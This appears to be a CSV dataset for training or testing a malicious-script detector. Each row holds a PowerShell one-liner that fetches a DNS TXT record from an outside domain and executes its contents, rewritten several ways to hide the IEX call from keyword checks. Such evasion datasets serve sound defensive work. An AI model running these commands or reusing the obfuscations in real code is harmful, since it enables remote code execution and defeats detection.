variant_id,seed_id,filename,label,target_token,technique_id,family,runtime_target,variant_rank,indicator_family_targeted,indicator_count_before,indicator_count_after,literal_indicator_removed,raw_char_len,used_char_len,was_truncated,viability_status,viability_reason,static_parse_ok,static_invariants_ok,manual_review_required,parent_content_hash,variant_content_hash,content,seed_primary_indicator,candidate_tier,candidate_reason
variant_61eb2924df41,seed_327819e7d33f,784__seed_327819e7d33f__iex_alternating_case.ps1,malicious,BLOCK,iex_alternating_case,keyword_hiding,cross_runtime,1,IEX,1,1,False,73,73,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,91c814e94f92,bebc508e893d,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){IeX $matches[1]}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_f87e0a9f2382,seed_327819e7d33f,784__seed_327819e7d33f__iex_format_string.ps1,malicious,BLOCK,iex_format_string,keyword_hiding,cross_runtime,2,IEX,1,0,True,95,95,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,91c814e94f92,04c79b31ce1d,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){&(('{0}{1}' -f 'I','EX')) $matches[1]}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_4da66c30e8bc,seed_327819e7d33f,784__seed_327819e7d33f__iex_ascii_char_array.ps1,malicious,BLOCK,iex_ascii_char_array,string_construction,cross_runtime,3,IEX,1,0,True,101,101,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,91c814e94f92,f4afae10d3ca,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){&((-join ([char[]](73,69,88)))) $matches[1]}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_8a905b494f85,seed_327819e7d33f,784__seed_327819e7d33f__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,4,IEX,1,0,True,81,81,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,91c814e94f92,20f933732123,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){&('I'+'EX') $matches[1]}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_a41b29805a2f,seed_327819e7d33f,784__seed_327819e7d33f__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,5,IEX,1,0,True,95,95,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,91c814e94f92,a35beb659f6c,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){&([scriptblock]::Create($matches[1]))}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_f025d600ea93,seed_0966fd07d90a,784__seed_0966fd07d90a__iex_alternating_case.ps1,malicious,BLOCK,iex_alternating_case,keyword_hiding,cross_runtime,1,IEX,1,1,False,73,73,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,91c814e94f92,bebc508e893d,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){IeX $matches[1]}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_96e112459343,seed_0966fd07d90a,784__seed_0966fd07d90a__iex_format_string.ps1,malicious,BLOCK,iex_format_string,keyword_hiding,cross_runtime,2,IEX,1,0,True,95,95,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,91c814e94f92,04c79b31ce1d,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){&(('{0}{1}' -f 'I','EX')) $matches[1]}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_4dde7ba73472,seed_0966fd07d90a,784__seed_0966fd07d90a__iex_ascii_char_array.ps1,malicious,BLOCK,iex_ascii_char_array,string_construction,cross_runtime,3,IEX,1,0,True,101,101,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,91c814e94f92,f4afae10d3ca,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){&((-join ([char[]](73,69,88)))) $matches[1]}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_235d802a9300,seed_0966fd07d90a,784__seed_0966fd07d90a__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,4,IEX,1,0,True,81,81,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,91c814e94f92,20f933732123,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){&('I'+'EX') $matches[1]}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_11cafaf0cb0e,seed_0966fd07d90a,784__seed_0966fd07d90a__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,5,IEX,1,0,True,95,95,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,91c814e94f92,a35beb659f6c,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){&([scriptblock]::Create($matches[1]))}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_4a87fcb606de,seed_0a5c987dc338,2115__seed_0a5c987dc338__iex_alternating_case.ps1,malicious,BLOCK,iex_alternating_case,keyword_hiding,cross_runtime,1,IEX,1,1,False,78,78,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,b2fd12fcb4b8,3b884032fe5c,if(''+(nslookup -q=txt p.s.pn.ns.sse.net.pl) -match '@(.*)@'){IeX $matches[1]},IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_5f8d3de7aeb2,seed_0a5c987dc338,2115__seed_0a5c987dc338__iex_format_string.ps1,malicious,BLOCK,iex_format_string,keyword_hiding,cross_runtime,2,IEX,1,0,True,100,100,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,b2fd12fcb4b8,02ad483dc8bb,"if(''+(nslookup -q=txt p.s.pn.ns.sse.net.pl) -match '@(.*)@'){&(('{0}{1}' -f 'I','EX')) $matches[1]}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_25d4b6358886,seed_0a5c987dc338,2115__seed_0a5c987dc338__iex_ascii_char_array.ps1,malicious,BLOCK,iex_ascii_char_array,string_construction,cross_runtime,3,IEX,1,0,True,106,106,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,b2fd12fcb4b8,6875948abb4e,"if(''+(nslookup -q=txt p.s.pn.ns.sse.net.pl) -match '@(.*)@'){&((-join ([char[]](73,69,88)))) $matches[1]}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_74af7883539f,seed_0a5c987dc338,2115__seed_0a5c987dc338__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,4,IEX,1,0,True,86,86,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,b2fd12fcb4b8,aa755d3e254c,if(''+(nslookup -q=txt p.s.pn.ns.sse.net.pl) -match '@(.*)@'){&('I'+'EX') $matches[1]},IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_33705e708a90,seed_0a5c987dc338,2115__seed_0a5c987dc338__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,5,IEX,1,0,True,100,100,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,b2fd12fcb4b8,1c2861d025f8,if(''+(nslookup -q=txt p.s.pn.ns.sse.net.pl) -match '@(.*)@'){&([scriptblock]::Create($matches[1]))},IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_df5efada68b0,seed_f65f10c4da0e,2115__seed_f65f10c4da0e__iex_alternating_case.ps1,malicious,BLOCK,iex_alternating_case,keyword_hiding,cross_runtime,1,IEX,1,1,False,78,78,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,b2fd12fcb4b8,3b884032fe5c,if(''+(nslookup -q=txt p.s.pn.ns.sse.net.pl) -match '@(.*)@'){IeX $matches[1]},IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_8385a81a3be6,seed_f65f10c4da0e,2115__seed_f65f10c4da0e__iex_format_string.ps1,malicious,BLOCK,iex_format_string,keyword_hiding,cross_runtime,2,IEX,1,0,True,100,100,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,b2fd12fcb4b8,02ad483dc8bb,"if(''+(nslookup -q=txt p.s.pn.ns.sse.net.pl) -match '@(.*)@'){&(('{0}{1}' -f 'I','EX')) $matches[1]}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_c1a9c96641ec,seed_f65f10c4da0e,2115__seed_f65f10c4da0e__iex_ascii_char_array.ps1,malicious,BLOCK,iex_ascii_char_array,string_construction,cross_runtime,3,IEX,1,0,True,106,106,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,b2fd12fcb4b8,6875948abb4e,"if(''+(nslookup -q=txt p.s.pn.ns.sse.net.pl) -match '@(.*)@'){&((-join ([char[]](73,69,88)))) $matches[1]}",IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_91df1fa60492,seed_f65f10c4da0e,2115__seed_f65f10c4da0e__iex_call_operator_string.ps1,malicious,BLOCK,iex_call_operator_string,execution_indirection,cross_runtime,4,IEX,1,0,True,86,86,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,b2fd12fcb4b8,aa755d3e254c,if(''+(nslookup -q=txt p.s.pn.ns.sse.net.pl) -match '@(.*)@'){&('I'+'EX') $matches[1]},IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
variant_9321099194f2,seed_f65f10c4da0e,2115__seed_f65f10c4da0e__iex_scriptblock_create.ps1,malicious,BLOCK,iex_scriptblock_create,execution_indirection,cross_runtime,5,IEX,1,0,True,100,100,False,needs_review,"tree_sitter_only_missing_required_runtime:pwsh_7,windows_powershell_5_1",False,True,True,b2fd12fcb4b8,1c2861d025f8,if(''+(nslookup -q=txt p.s.pn.ns.sse.net.pl) -match '@(.*)@'){&([scriptblock]::Create($matches[1]))},IEX,provisional_iex,invariants_ok_missing_runtime_side_parse_validation
